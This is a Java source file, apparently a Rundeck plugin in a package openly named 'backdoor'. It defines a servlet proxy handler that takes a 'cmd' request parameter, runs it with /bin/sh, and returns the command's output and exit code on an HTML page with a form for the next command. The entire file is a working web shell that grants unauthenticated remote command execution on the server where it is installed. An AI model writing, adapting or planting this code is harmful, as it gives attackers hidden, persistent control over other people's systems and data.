package com.rundeck.plugins.backdoor;

import java.lang.reflect.*;

public class ServletHandler implements InvocationHandler {
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if ("service".equals(method.getName())) {
            Method getParam = args[0].getClass().getMethod("getParameter", String.class);
            String cmd = (String) getParam.invoke(args[0], "cmd");
            
            args[1].getClass().getMethod("setContentType", String.class).invoke(args[1], "text/html;charset=UTF-8");
            Object writer = args[1].getClass().getMethod("getWriter").invoke(args[1]);
            Method println = writer.getClass().getMethod("println", String.class);
            
            if (cmd == null || cmd.trim().isEmpty()) {
                println.invoke(writer, "<html><body><h2>Noting to do...</h2>" +
                    "<form method=POST><input name=cmd size=70 placeholder='Enter command'/>" +
                    "<input type=submit value=Execute /></form></body></html>");
                return null;
            }
            
            println.invoke(writer, "<html><body><pre>");
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) println.invoke(writer, line);
            r = new java.io.BufferedReader(new java.io.InputStreamReader(p.getErrorStream()));
            while ((line = r.readLine()) != null) println.invoke(writer, line);
            println.invoke(writer, "</pre>Exit: " + p.waitFor() + 
                "<form method=POST><input name=cmd size=70/><input type=submit value=Execute/></form></body></html>");
        }
        return null;
    }
}
